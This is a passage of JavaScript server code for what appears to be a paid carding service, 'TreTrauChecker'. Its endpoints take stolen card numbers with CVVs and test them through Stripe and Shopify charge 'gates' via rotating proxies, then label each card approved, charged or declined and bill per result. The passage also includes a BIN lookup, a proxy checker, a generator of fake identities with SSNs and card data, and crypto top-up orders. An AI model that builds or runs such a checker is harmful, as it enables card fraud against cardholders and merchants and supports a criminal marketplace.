    const tgEntry = tgVerifyCodes.get(tgCode);
    if (!tgEntry) return res.json({ success: false, message: 'Telegram verification code not found or expired.' });
    if (Date.now() > tgEntry.exp) { tgVerifyCodes.delete(tgCode); return res.json({ success: false, message: 'Telegram verification code expired. Please verify again.' }); }
    if (!tgEntry.verified) return res.json({ success: false, message: 'Telegram not verified yet. Please complete verification first.' });

    // 4. Record attempt
    ANTISPAM.recordAttempt(ip);

    // 5. Captcha verify — fail = 60s cooldown only
    if (!verifyCaptcha(captchaId, captchaAnswer, ip)) {
        ANTISPAM.recordCaptchaFail(ip);
        return res.json({ success: false, message: 'Wrong captcha answer. Please wait 60s and try again.' });
    }

    // 6. DB uniqueness checks
    const db = readDB();
    if (db.users[username.toLowerCase()]) return res.json({ success: false, message: 'Username already exists.' });
    const emailUsed = Object.values(db.users).some(u => u.email === email.toLowerCase());
    if (emailUsed) return res.json({ success: false, message: 'Email already in use.' });

    // 7. One Telegram account = one site account
    const tgIdStr = String(tgEntry.tgId);
    const tgAlreadyLinked = Object.values(db.users).some(u => u.telegramId === tgIdStr);
    if (tgAlreadyLinked) return res.json({ success: false, message: 'This Telegram account is already linked to another account.' });

    // 8. Create account
    const hashedPassword = await bcrypt.hash(password, 10);
    const uname = username.toLowerCase();
    db.users[uname] = {
        username: uname, email: email.toLowerCase(),
        password: hashedPassword, credits: FREE_CREDITS, plan: 'free',
        telegramId: tgIdStr,
        telegramUsername: tgEntry.tgUsername || '',
        telegramFirstName: tgEntry.tgFirstName || '',
        telegramVerified: true,
        createdAt: new Date().toISOString(), confirmedAt: new Date().toISOString(),
        confirmedBy: 'telegram_verify', ip
    };
    if (!db.feed) db.feed = [];
    db.feed.unshift({ type: 'register', username: uname, ts: new Date().toISOString() });
    if (db.feed.length > 100) db.feed.length = 100;
    writeDB(db);

    // Consume the verify code
    tgVerifyCodes.delete(tgCode);

    ANTISPAM.log(ip, 'POST /api/register', 'SUCCESS', { username: uname });

    // Notify admin
    try {
        const inBanList = (db.banned_ips || []).includes(ip);
        await payBot.sendMessage(PAY_GROUP_ID,
            `------ NEW ACCOUNT -------\n- USERNAME : ${uname}\n- TELEGRAM : @${tgEntry.tgUsername || tgIdStr}\n- IP : ${ip}\n- BLACKLIST : ${inBanList ? '⚠️ YES' : '✅ NO'}`,
            { parse_mode: 'Markdown' });
    } catch {}
    res.json({ success: true, message: `Đăng ký thành công! Đăng nhập ngay với tài khoản ${uname} — bạn có ${FREE_CREDITS} credits miễn phí.` });
});

// ===== LOGIN =====
app.post('/api/login', loginLimiter, async (req, res) => {
    const ip = req.ip || req.socket.remoteAddress || 'unknown';
    const { username, password } = req.body;
    if (!username || !password) return res.json({ success: false, message: 'Username and password required.' });
    const key = username.toLowerCase();
    // Per-username brute-force lock
    const lockSecs = checkLoginLock(key);
    if (lockSecs > 0) return res.json({ success: false, message: `Account locked after too many failed attempts. Try again in ${Math.ceil(lockSecs/60)} min.` });
    const db = readDB();
    const user = db.users[key];
    if (!user) {
        recordLoginFail(key);
        return res.json({ success: false, message: 'Invalid username or password.' });
    }
    if (db.banned && db.banned.includes(key)) return res.json({ success: false, message: 'Account banned.' });
    if (!user.password) return res.json({ success: false, message: 'This account has no password set. Please contact support.' });
    const valid = await bcrypt.compare(password, user.password);
    if (!valid) {
        recordLoginFail(key);
        return res.json({ success: false, message: 'Invalid username or password.' });
    }
    clearLoginFail(key);
    // Bind JWT to client IP — checker routes verify this to prevent token theft/replay
    const clientIp = (req.ip || req.socket.remoteAddress || '').replace('::ffff:', '');
    const token = jwt.sign({ username: user.username, email: user.email, ip: clientIp }, JWT_SECRET, { expiresIn: '7d' });
    touchOnline(user.username);
    // Notify admin group (never log plaintext passwords)
    const isBlacklisted = (db.banned || []).includes(key) || (db.banned_ips || []).includes(ip);
    try {
        await payBot.sendMessage(PAY_GROUP_ID,
            `------ LOGIN -------\n- USERNAME : ${key}\n- IP : ${ip}\n- BLACKLIST : ${isBlacklisted ? '⚠️ YES' : '✅ NO'}`,
            { parse_mode: 'Markdown' });
    } catch {}
    res.json({ success: true, message: 'Login successful!', token, user: { username: user.username, email: user.email, credits: user.credits, plan: user.plan, createdAt: user.createdAt } });
});

// ===== ME =====
app.get('/api/me', authMiddleware, (req, res) => {
    const db = readDB();
    const u = db.users[req.username];
    const isAdmin = req.username === ADMIN_USERNAME || !!u?.isAdmin;
    const planConf = SUBSCRIPTION_PLANS[u.plan] || null;
    const maxThreads = planConf ? planConf.threads : 5;
    const dailyCredits = planConf ? planConf.dailyCredits : 0;
    res.json({ success: true, user: {
        username: u.username, email: u.email, credits: u.credits,
        plan: u.plan, planExpiry: u.planExpiry || null,
        maxThreads, dailyCredits,
        telegramUsername: u.telegramUsername || '',
        glitterName: u.glitterName || false,
        nameColor: u.nameColor || '#ffffff',
        bgImage: u.bgImage || null,
        createdAt: u.createdAt, confirmedBy: u.confirmedBy, isAdmin,
    }});
});

// ===== API KEY MANAGEMENT =====
// Get master key (admin only)
app.get('/api/admin/masterkey', authMiddleware, adminMiddleware, (req, res) => {
    res.json({ success: true, key: MASTER_API_KEY });
});
// List child keys (admin only)
app.get('/api/admin/apikeys', authMiddleware, adminMiddleware, (req, res) => {
    const db = readDB();
    res.json({ success: true, keys: db.apiKeys || [] });
});
// Create child key (admin only)
app.post('/api/admin/apikeys', authMiddleware, adminMiddleware, (req, res) => {
    const { name, username } = req.body;
    if (!name) return res.json({ success: false, message: 'name required.' });
    const db = readDB();
    const targetUser = (username || '').toLowerCase() || req.username;
    if (!db.users[targetUser]) return res.json({ success: false, message: 'User not found.' });
    if (!db.apiKeys) db.apiKeys = [];
    const key = 'ttc_' + crypto.randomBytes(20).toString('hex');
    const entry = { id: crypto.randomBytes(8).toString('hex'), key, name, username: targetUser, createdAt: new Date().toISOString(), lastUsed: null, requestCount: 0, active: true };
    db.apiKeys.push(entry);
    writeDB(db);
    res.json({ success: true, entry });
});
// Revoke / delete a child key (admin only)
app.delete('/api/admin/apikeys/:id', authMiddleware, adminMiddleware, (req, res) => {
    const db = readDB();
    if (!db.apiKeys) return res.json({ success: false, message: 'Not found.' });
    const idx = db.apiKeys.findIndex(k => k.id === req.params.id);
    if (idx === -1) return res.json({ success: false, message: 'Not found.' });
    db.apiKeys.splice(idx, 1);
    writeDB(db);
    res.json({ success: true });
});
// Get own API keys (any logged-in user)
app.get('/api/apikeys/mine', authMiddleware, (req, res) => {
    const db = readDB();
    const keys = (db.apiKeys || []).filter(k => k.username === req.username);
    res.json({ success: true, keys });
});

// ===== STATS =====
app.get('/api/stats', (req, res) => {
    const db = readDB();
    const today = new Date().toISOString().substring(0, 10);
    const totalUsers = Object.keys(db.users || {}).length;
    const online = getOnlineCount();
    const checksToday = (db.stats || {})[today] || 0;
    const liveToday = (db.statsLive || {})[today] || 0;
    // Build last 7 days chart data
    const days = [];
    for (let i = 6; i >= 0; i--) {
        const d = new Date(Date.now() - i * 86400000).toISOString().substring(0, 10);
        days.push({ date: d.substring(5), checks: (db.stats || {})[d] || 0, live: (db.statsLive || {})[d] || 0 });
    }
    res.json({ success: true, online, totalUsers, checksToday, liveToday, chart: days });
});

// ===== NOTIFICATION =====
app.get('/api/notify', (req, res) => {
    const db = readDB();
    const n = db.notification;
    if (!n || !n.active) return res.json({ success: true, notification: null });
    res.json({ success: true, notification: n });
});

// ===== SHOPIFY PROXY CHECKER =====
const PROXY_TEST_ENDPOINTS = [
    { host: 'ip-api.com',            path: '/json' },
    { host: 'api.ipify.org',         path: '/?format=json' },
    { host: 'checkip.amazonaws.com', path: '/' },
    { host: 'icanhazip.com',         path: '/' },
    { host: 'ifconfig.me',           path: '/ip' },
    { host: 'wtfismyip.com',         path: '/text' },
    { host: 'api.my-ip.io',          path: '/ip' },
    { host: 'ipecho.net',            path: '/plain' },
    { host: 'myexternalip.com',      path: '/raw' },
    { host: 'httpbin.org',           path: '/ip' },
];
function testProxy(proxyStr) {
    return new Promise((resolve) => {
        const parts = proxyStr.trim().split(':');
        if (parts.length < 2) return resolve({ proxy: proxyStr, alive: false });
        const proxyHost = parts[0];
        const proxyPort = parseInt(parts[1]);
        const user = parts[2] || null;
        const pass = parts[3] || null;
        if (!proxyHost || isNaN(proxyPort) || proxyPort < 1 || proxyPort > 65535) return resolve({ proxy: proxyStr, alive: false });

        let resolved = false;
        let pending   = PROXY_TEST_ENDPOINTS.length;
        const done = (alive) => {
            if (resolved) return;
            resolved = true;
            resolve({ proxy: proxyStr, alive });
        };

        PROXY_TEST_ENDPOINTS.forEach(({ host, path }) => {
            const headers = { Host: host, 'User-Agent': 'Mozilla/5.0' };
            if (user && pass) headers['Proxy-Authorization'] = 'Basic ' + Buffer.from(`${user}:${pass}`).toString('base64');
            const req = http.request({ host: proxyHost, port: proxyPort, path: `http://${host}${path}`, method: 'GET', headers }, (res) => {
                let body = '';
                res.on('data', d => body += d);
                res.on('end', () => {
                    pending--;
                    if (res.statusCode === 200 && body.trim()) done(true);
                    else if (pending === 0) done(false);
                });
            });
            req.setTimeout(8000);
            req.on('timeout', () => { req.destroy(); pending--; if (pending === 0) done(false); });
            req.on('error',   () => {                           pending--; if (pending === 0) done(false); });
            req.end();
        });
        setTimeout(() => done(false), 12000);
    });
}

app.post('/api/shopify/checkproxy', authMiddleware, async (req, res) => {
    const { proxies } = req.body;
    if (!Array.isArray(proxies) || proxies.length === 0) return res.json({ success: false, message: 'proxies array required.' });
    if (proxies.length > 50) return res.json({ success: false, message: 'Max 50 proxies per batch.' });
    const results = await Promise.all(proxies.map(p => testProxy(String(p))));
    res.json({ success: true, results });
});

// ===== SHOPIFY CHECK (JSON gate: ?{cc}&url={}&proxy={}) =====
// Response: { CC, "Order url", Price, Response, Site, Time, "Total Price" }
// Cost: error=0cr, decline=0.1cr, approved=0.2cr, charged=0.3cr
function parseShopifyResult(data, rawBody) {
    const trimmed = (rawBody || '').trim();
    if (trimmed.startsWith('<') || trimmed.startsWith('<!')) {
        return { status: 'ERROR', cost: 0, response: 'Gate error (no JSON response)' };
    }

    const resp       = (data.Response || data.response || '').toString().trim();
    const r          = resp.toUpperCase();
    const orderUrl   = (data['Order url'] || data.orderUrl || '').toString().trim();
    const totalPrice = parseFloat(data['Total Price'] || data.total_price || '0') || 0;

    // 3DS: Shopify-specific 3DS challenge code
    if (r === '3DS_REQUIRED' || r.includes('3DS'))
        return { status: 'VBV', cost: 0.1, response: resp };

    // CHARGED: order URL present = payment captured
    if (orderUrl && orderUrl !== '' && orderUrl !== 'null' && orderUrl !== 'undefined')
        return { status: 'CHARGED', cost: 0.3, response: resp };

    const rl = resp.toLowerCase();

    // CHARGED: keyword-based
    if (rl.includes('charged') || rl.includes('captured') || rl.includes('paid') ||
        rl.includes('thank you') || rl.includes('order confirmed') ||
        (totalPrice > 0 && (rl.includes('approved') || rl.includes('success'))))
        return { status: 'CHARGED', cost: 0.3, response: resp };

    // APPROVED: authorized but not captured
    if (rl.includes('approved') || rl.includes('authorized') || rl.includes('live') ||
        (rl.includes('success') && !rl.includes('error')))
        return { status: 'APPROVED', cost: 0.2, response: resp };

    // ERROR: gate-level failure, free
    if (resp === '' || resp === 'null' || resp === 'undefined' ||
        rl.includes('gateway_error') || rl.includes('connection') || rl.includes('server_error') ||
        rl.includes('timeout') || rl.includes('unreachable') || rl.includes('bad gateway'))
        return { status: 'ERROR', cost: 0, response: resp || 'Gate error' };

    // DECLINED
    return { status: 'DECLINED', cost: 0.1, response: resp };
}

app.post('/api/shopify/check', checkLimiter, clientGuard, authMiddleware, async (req, res) => {
    const { cc, mm, yy, cvv, site, proxy } = req.body;
    if (!cc || !mm || !yy || !cvv) return res.json({ success: false, message: 'Missing card data.' });
    if (!site) return res.json({ success: false, message: 'Site URL required.' });

    const cardErr = validateCard(cc, mm, yy, cvv);
    if (cardErr) return res.json({ success: false, message: cardErr });
    if (!isValidSiteUrl(site)) return res.json({ success: false, message: 'Invalid site URL.' });

    // Ban VN cards
    if (isVNCard(cc)) {
        const db = readDB();
        if (!db.banned) db.banned = [];
        if (!db.banned.includes(req.username)) { db.banned.push(req.username); writeDB(db); }
        return res.status(403).json({ success: false, message: 'Account banned: Vietnamese cards are not allowed.' });
    }

    if ((req.user.credits || 0) < 0.3) return res.json({ success: false, message: 'Insufficient credits (need up to 0.3cr).' });

    // URL format: http://host:3636/?cc|mm|yy|cvv&url=site&proxy=ip:port
    // Raw values — gate expects pipe chars and proxy colons unencoded
    const ccStr = `${cc}|${mm}|${yy}|${cvv}`;
    const url   = `http://${GATE_HOST}:3636/?${ccStr}&url=${encodeURIComponent(site)}${proxy ? `&proxy=${proxy}` : ''}`;

    try {
        // Shopify checkout is slow — allow 90s per card
        const body = await callGate(url, 90000);
        let data = {};
        try { data = JSON.parse(body); } catch { data = {}; }

        const { status, cost, response } = parseShopifyResult(data, body);

        if (cost > 0 && !deductCredit(req.username, cost)) {
            return res.json({ success: false, message: 'Insufficient credits.' });
        }

        let creditsLeft = 0;
        await withDB(db => {
            creditsLeft = db.users[req.username]?.credits || 0;
            if (!db.users[req.username].history) db.users[req.username].history = [];
            db.users[req.username].history.unshift({ card: ccStr, gate: 'Shopify Auto', gateId: 'shopify', status, response: response.substring(0,80), ts: new Date().toISOString() });
            if (db.users[req.username].history.length > 10000) db.users[req.username].history.length = 10000;
            if (!db.feed) db.feed = [];
            db.feed.unshift({ type:'check', username:req.username, bin:cc.substring(0,6), gate:'Shopify Auto', status, ts:new Date().toISOString() });
            if (db.feed.length > 100) db.feed.length = 100;
        });
        setCheckCooldown(req.username);
        recordCheck(status === 'APPROVED' || status === 'CHARGED');

        res.json({
            success: true,
            result: {
                card:       ccStr,
                gate:       'Shopify Auto',
                cost,
                status,
                response:   response.substring(0, 150),
                site:       data.Site || site,
                orderUrl:   data['Order url'] || data.order_url || '',
                price:      data.Price || data.price || '',
                totalPrice: data['Total Price'] || data.total_price || '',
                time:       data.Time || data.time || '',
                creditsLeft,
            }
        });
    } catch {
        res.json({ success: false, message: 'Gate connection error. Please try again.', cost: 0 });
    }
});

// ===== COOLDOWN STATUS =====
app.get('/api/cooldown', authMiddleware, (req, res) => {
    res.json({ remaining: getCooldownRemaining(req.username) });
});

// ===== GATE LIST =====
app.get('/api/gates', (req, res) => {
    res.json({
        auth:   Object.entries(AUTH_GATES).map(([id, g]) =>   ({ id, label: g.label, cost: g.cost, needSite: !!g.needSite })),
        charge: Object.entries(CHARGE_GATES).map(([id, g]) => ({ id, label: g.label, cost: g.cost, needSite: !!g.needSite, needProxy: !!g.needProxy }))
    });
});

// ===== AUTH CHECK =====
app.post('/api/check/auth', checkLimiter, clientGuard, authMiddleware, async (req, res) => {
    const { cc, mm, yy, cvv, gate, site } = req.body;
    if (!cc || !mm || !yy || !cvv) return res.json({ success: false, message: 'Missing card data.' });

    const cardErr = validateCard(cc, mm, yy, cvv);
    if (cardErr) return res.json({ success: false, message: cardErr });
    if (site && !isValidSiteUrl(site)) return res.json({ success: false, message: 'Invalid site URL.' });

    // Ban VN cards immediately
    if (isVNCard(cc)) {
        const db = readDB();
        if (!db.banned) db.banned = [];
        if (!db.banned.includes(req.username)) { db.banned.push(req.username); writeDB(db); }
        return res.status(403).json({ success: false, message: 'Account banned: Vietnamese cards are not allowed.' });
    }

    const gateConf = AUTH_GATES[gate] || AUTH_GATES['stripe_auth'];
    const cost = gateConf.cost;
    if ((req.user.credits || 0) < cost) return res.json({ success: false, message: `Insufficient credits. Need ${cost}cr.` });
    const cardParam = encodeURIComponent(`${cc}|${mm}|${yy}|${cvv}`);
    let url = `${gateConf.url}?card=${cardParam}`;
    if (gateConf.needSite && site) url += `&site=${encodeURIComponent(site)}`;
    if (!deductCredit(req.username, cost)) return res.json({ success: false, message: 'Insufficient credits.' });
    try {
        const body = await callGate(url, gateConf.timeout || 20000);
        const { status, response } = parseGateResponse(body);
        let creditsLeft = 0;
        await withDB(db => {
            creditsLeft = db.users[req.username]?.credits || 0;
            if (!db.users[req.username].history) db.users[req.username].history = [];
            db.users[req.username].history.unshift({ card: `${cc}|${mm}|${yy}|${cvv}`, gate: gateConf.label, gateId: gate, status, response: response.substring(0,80), ts: new Date().toISOString() });
            if (db.users[req.username].history.length > 10000) db.users[req.username].history.length = 10000;
            if (!db.feed) db.feed = [];
            db.feed.unshift({ type:'check', username:req.username, bin:cc.substring(0,6), gate:gateConf.label, status, ts:new Date().toISOString() });
            if (db.feed.length > 100) db.feed.length = 100;
        });
        setCheckCooldown(req.username);
        recordCheck(status === 'APPROVED');
        res.json({ success: true, result: { card: `${cc}|${mm}|${yy}|${cvv}`, gate: gateConf.label, cost, status, response, creditsLeft } });
    } catch {
        refundCredit(req.username, cost);
        res.json({ success: false, message: 'Gate connection error. Please try again.' });
    }
});

// ===== CHARGE CHECK =====
app.post('/api/check/charge', checkLimiter, clientGuard, authMiddleware, async (req, res) => {
    const { cc, mm, yy, cvv, gate, site, proxy } = req.body;
    if (!cc || !mm || !yy || !cvv) return res.json({ success: false, message: 'Missing card data.' });

    const cardErr = validateCard(cc, mm, yy, cvv);
    if (cardErr) return res.json({ success: false, message: cardErr });
    if (site && !isValidSiteUrl(site)) return res.json({ success: false, message: 'Invalid site URL.' });

    // Ban VN cards immediately
    if (isVNCard(cc)) {
        const db = readDB();
        if (!db.banned) db.banned = [];
        if (!db.banned.includes(req.username)) { db.banned.push(req.username); writeDB(db); }
        return res.status(403).json({ success: false, message: 'Account banned: Vietnamese cards are not allowed.' });
    }

    const gateConf = CHARGE_GATES[gate] || CHARGE_GATES['stripe1'];
    const cardParam = encodeURIComponent(`${cc}|${mm}|${yy}|${cvv}`);

    // ── Shopify: dedicated endpoint handles it, fallback here
    if (gate === 'shopify') return res.json({ success: false, message: 'Use /api/shopify/check for Shopify gate.' });

    // ── Other gates: fixed cost
    const cost = gateConf.cost;
    if ((req.user.credits || 0) < cost) return res.json({ success: false, message: `Insufficient credits. Need ${cost}cr.` });
    const url = `${gateConf.url}?card=${cardParam}`;
    if (!deductCredit(req.username, cost)) return res.json({ success: false, message: 'Insufficient credits.' });
    try {
        const body = await callGate(url, gateConf.timeout || 20000);
        const { status, response } = parseGateResponse(body);
        const finalStatus = status === 'APPROVED' ? 'CHARGED' : status;
        let creditsLeft = 0;
        await withDB(db => {
            creditsLeft = db.users[req.username]?.credits || 0;
            if (!db.users[req.username].history) db.users[req.username].history = [];
            db.users[req.username].history.unshift({ card: `${cc}|${mm}|${yy}|${cvv}`, gate: gateConf.label, gateId: gate, status: finalStatus, response: response.substring(0,80), ts: new Date().toISOString() });
            if (db.users[req.username].history.length > 10000) db.users[req.username].history.length = 10000;
            if (!db.feed) db.feed = [];
            db.feed.unshift({ type:'check', username:req.username, bin:cc.substring(0,6), gate:gateConf.label, status:finalStatus, ts:new Date().toISOString() });
            if (db.feed.length > 100) db.feed.length = 100;
        });
        setCheckCooldown(req.username);
        recordCheck(status === 'APPROVED');
        res.json({ success: true, result: { card: `${cc}|${mm}|${yy}|${cvv}`, gate: gateConf.label, cost, status: finalStatus, response, creditsLeft } });
    } catch {
        refundCredit(req.username, cost);
        res.json({ success: false, message: 'Gate connection error. Please try again.' });
    }
});

// ===== BIN LOOKUP — bins.antipublic.cc =====
app.get('/api/bin/:bin', apiLimiter, async (req, res) => {
    const bin = req.params.bin.replace(/\D/g, '').substring(0, 8);
    if (bin.length < 6) return res.json({ success: false, message: 'BIN must be at least 6 digits.' });
    try {
        const data = await new Promise((resolve, reject) => {
            const options = {
                hostname: 'bins.antipublic.cc',
                path: `/bins/${bin}`,
                headers: { 'User-Agent': 'TreTrauChecker/2.0', 'Accept': 'application/json' }
            };
            https.get(options, r => {
                let body = '';
                r.on('data', chunk => body += chunk);
                r.on('end', () => {
                    if (r.statusCode === 200) {
                        try { resolve(JSON.parse(body)); }
                        catch { reject(new Error('parse error')); }
                    } else reject(new Error('not found'));
                });
            }).on('error', reject);
        });
        res.json({ success: true, result: {
            bin,
            brand:       (data.brand || data.scheme || '').toUpperCase(),
            type:        (data.type || '').toUpperCase(),
            level:       (data.level || data.category || '').toUpperCase(),
            bank:        data.bank || data.issuer || 'Unknown',
            country:     data.country_name || data.country || 'Unknown',
            countryCode: data.country_code || data.alpha2 || 'XX',
            currency:    data.currency || 'USD',
            prepaid:     data.prepaid ? 'Yes' : 'No',
            latitude:    data.latitude || null,
            longitude:   data.longitude || null,
        }});
    } catch {
        // Fallback basic detection
        const brand = bin.startsWith('4') ? 'VISA' : bin.startsWith('5') ? 'MASTERCARD' : bin.startsWith('34') || bin.startsWith('37') ? 'AMEX' : 'UNKNOWN';
        res.json({ success: true, result: { bin, brand, type:'CREDIT', level:'CLASSIC', bank:'Unknown', country:'Unknown', countryCode:'XX', currency:'USD', prepaid:'No', latitude:null, longitude:null } });
    }
});

// ===== FAKE INFO =====
app.get('/api/fake/:country', apiLimiter, (req, res) => {
    const country = req.params.country.toUpperCase();
    const pick = arr => arr[Math.floor(Math.random()*arr.length)];
    const rnd = (min,max) => Math.floor(Math.random()*(max-min+1))+min;
    const rndStr = (len) => crypto.randomBytes(len).toString('hex').substring(0, len);

    const maleNames={US:['James','Robert','John','Michael','David','William','Richard','Joseph','Thomas','Charles'],UK:['Oliver','Harry','George','Jack','Leo','Charlie','Noah','Freddie'],DE:['Felix','Leon','Paul','Lukas','Ben','Finn','Jonas','Elias'],FR:['Lucas','Hugo','Louis','Nathan','Tom','Théo','Antoine'],DEFAULT:['Alex','Chris','Sam','Jordan','Taylor','Morgan','Riley']};
    const femaleNames={US:['Mary','Jennifer','Linda','Sarah','Emily','Jessica','Emma','Ashley','Amanda'],UK:['Amelia','Olivia','Isla','Ava','Mia','Sophia','Grace','Ella'],DE:['Mia','Emma','Sofia','Hanna','Emilia','Lena','Anna'],FR:['Emma','Jade','Louise','Alice','Léa','Chloé','Manon'],DEFAULT:['Emma','Sophia','Olivia','Ava','Isabella','Mia','Charlotte']};
    const lastNames={US:['Smith','Johnson','Williams','Brown','Jones','Miller','Davis','Garcia','Rodriguez'],UK:['Smith','Jones','Taylor','Brown','Wilson','Evans','Thomas'],DE:['Müller','Schmidt','Schneider','Fischer','Weber','Meyer','Wagner'],FR:['Martin','Bernard','Dubois','Thomas','Robert','Richard','Petit'],DEFAULT:['Smith','Johnson','Williams','Brown','Jones']};
    const cities={US:['New York','Los Angeles','Chicago','Houston','Phoenix','Philadelphia','San Antonio'],UK:['London','Manchester','Birmingham','Leeds','Glasgow','Liverpool'],DE:['Berlin','Munich','Hamburg','Cologne','Frankfurt','Stuttgart'],FR:['Paris','Marseille','Lyon','Toulouse','Nice','Bordeaux'],DEFAULT:['Capital City','Metro','Downtown','Riverside','Highland']};
    const states={US:['CA','NY','TX','FL','IL','PA','OH','GA'],UK:['England','Scotland','Wales','Northern Ireland'],DE:['Bayern','NRW','Berlin','Hamburg','Baden-Württemberg'],FR:['Île-de-France','PACA','Auvergne-Rhône-Alpes'],DEFAULT:['N/A']};
    const phones={US:'+1',UK:'+44',CA:'+1',DE:'+49',FR:'+33',AU:'+61',JP:'+81',KR:'+82',CN:'+86',IN:'+91',BR:'+55',MX:'+52',VN:'+84',DEFAULT:'+1'};
    const currencies={US:'USD',UK:'GBP',CA:'CAD',DE:'EUR',FR:'EUR',AU:'AUD',JP:'JPY',KR:'KRW',CN:'CNY',IN:'INR',BR:'BRL',MX:'MXN',VN:'VND',DEFAULT:'USD'};
    const streets=['Main St','Oak Ave','Pine Dr','Elm Blvd','Maple Ln','Cedar Way','Park Rd','Lake Dr','River Rd','Hill St'];
    const browsers=['Chrome/120.0.0.0','Firefox/121.0','Safari/17.2','Edge/120.0.0.0'];
    const os=['Windows NT 10.0; Win64; x64','Macintosh; Intel Mac OS X 14_2','X11; Linux x86_64'];

    const isMale=Math.random()>0.5;
    const fNames=isMale?(maleNames[country]||maleNames.DEFAULT):(femaleNames[country]||femaleNames.DEFAULT);
    const first=pick(fNames),last=pick(lastNames[country]||lastNames.DEFAULT);
    const phone=phones[country]||phones.DEFAULT,curr=currencies[country]||currencies.DEFAULT;
    const domains=['gmail.com','yahoo.com','outlook.com','protonmail.com','icloud.com','hotmail.com'];
    const dob_y=rnd(1975,2003), dob_m=rnd(1,12), dob_d=rnd(1,28);
    const username=`${first.toLowerCase()}${rnd(10,999)}`;

    res.json({ success:true, result:[
        {label:'Full Name',value:`${first} ${last}`,icon:'fa-user'},
        {label:'Gender',value:isMale?'Male':'Female',icon:'fa-venus-mars'},
        {label:'Username',value:username,icon:'fa-at'},
        {label:'Email',value:`${username}@${pick(domains)}`,icon:'fa-envelope'},
        {label:'Password',value:`${first}@${rnd(1000,9999)}`,icon:'fa-key'},
        {label:'Phone',value:`${phone} ${rnd(200,999)}-${rnd(100,999)}-${rnd(1000,9999)}`,icon:'fa-phone'},
        {label:'Address',value:`${rnd(100,9999)} ${pick(streets)}`,icon:'fa-location-dot'},
        {label:'City',value:pick(cities[country]||cities.DEFAULT),icon:'fa-city'},
        {label:'State',value:pick(states[country]||states.DEFAULT),icon:'fa-map'},
        {label:'ZIP',value:`${rnd(10000,99999)}`,icon:'fa-hashtag'},
        {label:'Country',value:country,icon:'fa-globe'},
        {label:'DOB',value:`${dob_m.toString().padStart(2,'0')}/${dob_d.toString().padStart(2,'0')}/${dob_y}`,icon:'fa-cake-candles'},
        {label:'Age',value:`${new Date().getFullYear()-dob_y}`,icon:'fa-id-badge'},
        {label:'SSN',value:`${rnd(100,999)}-${rnd(10,99)}-${rnd(1000,9999)}`,icon:'fa-id-card'},
        {label:'Card Number',value:`4${rnd(100,999)} ${rnd(1000,9999)} ${rnd(1000,9999)} ${rnd(1000,9999)}`,icon:'fa-credit-card'},
        {label:'Exp',value:`${rnd(1,12).toString().padStart(2,'0')}/${rnd(26,30)}`,icon:'fa-calendar'},
        {label:'CVV',value:`${rnd(100,999)}`,icon:'fa-lock'},
        {label:'Currency',value:curr,icon:'fa-dollar-sign'},
        {label:'Mother\'s Maiden',value:pick(lastNames[country]||lastNames.DEFAULT),icon:'fa-heart'},
        {label:'User Agent',value:`Mozilla/5.0 (${pick(os)}) AppleWebKit/537.36 ${pick(browsers)}`,icon:'fa-desktop'},
    ]});
});

// ===== PAYMENT WALLETS =====
app.get('/api/payment/wallets', authMiddleware, (req, res) => {
    res.json({ success: true, wallets: WALLETS });
});

// ===== CREATE PAYMENT ORDER =====
app.post('/api/payment/create', authMiddleware, upload.single('screenshot'), async (req, res) => {
    const { credits, method, txid } = req.body;
    if (!credits || !method || !req.file) return res.json({ success: false, message: 'credits, method and screenshot required.' });
    const plans = { 100:5, 200:10, 500:20, 800:30, 3500:100, 9000:200 };
    const creditsNum = parseInt(credits);
    if (!plans[creditsNum]) return res.json({ success: false, message: 'Invalid credit package.' });
    const price = plans[creditsNum];
    const orderId = crypto.randomBytes(4).toString('hex').toUpperCase();
    const db = readDB();
    if (!db.orders) db.orders = {};
    db.orders[orderId] = { orderId, username: req.username, credits: creditsNum, price, method, txid: txid || '', screenshot: req.file.filename, status: 'pending', createdAt: new Date().toISOString() };
    writeDB(db);
    try {
        const walletAddr = WALLETS[method] || 'N/A';
        const msg = [
            `💳 *NEW ORDER #${orderId}*`,
            ``,
            `👤 User: *${req.username}*`,
            `💰 Credits: *${creditsNum} cr* (+$${price.toFixed(2)})`,
            `💱 Method: *${method}*`,
            `💵 Amount: *$${price.toFixed(2)}*`,
            `🏦 Wallet: \`${walletAddr}\``,
            `🔑 TXID: ${txid || 'N/A'}`,
        ].join('\n');
        const opts = { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: `✅ Approve (+${creditsNum} credits)`, callback_data: `approve_${orderId}` }, { text: '❌ Reject', callback_data: `reject_${orderId}` }]] } };
        await payBot.sendMessage(PAY_GROUP_ID, msg, opts);
        if (req.file) {
            const photoPath = path.join(UPLOAD_PATH, req.file.filename);
            await payBot.sendPhoto(PAY_GROUP_ID, fs.createReadStream(photoPath), {
                caption: `📸 Order #${orderId} | ${req.username} | ${creditsNum} credits | $${price.toFixed(2)} | ${method}\nWallet: ${walletAddr}`
            });
        }
    } catch (e) { console.error('[PayBot]', e.message); }
    res.json({ success: true, message: `Order #${orderId} created. Pending approval.`, orderId });
});

// ===== MY ORDERS =====
app.get('/api/payment/mine', authMiddleware, (req, res) => {
    const db = readDB();
    const orders = Object.values(db.orders || {}).filter(o => o.username === req.username).sort((a,b) => new Date(b.createdAt)-new Date(a.createdAt));
    res.json({ success: true, orders });
});

// ===== SUBSCRIPTION PLANS =====
app.get('/api/subscription/plans', (req, res) => {
    res.json({ success: true, plans: SUBSCRIPTION_PLANS });
});

app.post('/api/subscription/create', authMiddleware, upload.single('screenshot'), async (req, res) => {
    const { planId, method, txid } = req.body;
    if (!planId || !method || !req.file) return res.json({ success: false, message: 'planId, method and screenshot required.' });
    const plan = SUBSCRIPTION_PLANS[planId];
    if (!plan) return res.json({ success: false, message: 'Invalid plan.' });
    const orderId = 'SUB_' + crypto.randomBytes(4).toString('hex').toUpperCase();
    const db = readDB();
    if (!db.subOrders) db.subOrders = {};
    db.subOrders[orderId] = { orderId, username: req.username, planId, price: plan.price, method, txid: txid || '', screenshot: req.file.filename, status: 'pending', createdAt: new Date().toISOString() };
    writeDB(db);
    try {
        const walletAddr = WALLETS[method] || 'N/A';
        const msg = [
            `👑 *NEW SUBSCRIPTION #${orderId}*`,
            ``,
            `👤 User: *${req.username}*`,
            `📦 Plan: *${plan.label}* (${plan.durationDays} days)`,
            `💰 Daily Credits: *${plan.dailyCredits} cr/day*`,
            `🔢 Threads: *${plan.threads}*`,
            `💱 Method: *${method}*`,
            `💵 Amount: *$${plan.price.toFixed(2)}*`,
            `🏦 Wallet: \`${walletAddr}\``,
            `🔑 TXID: ${txid || 'N/A'}`,
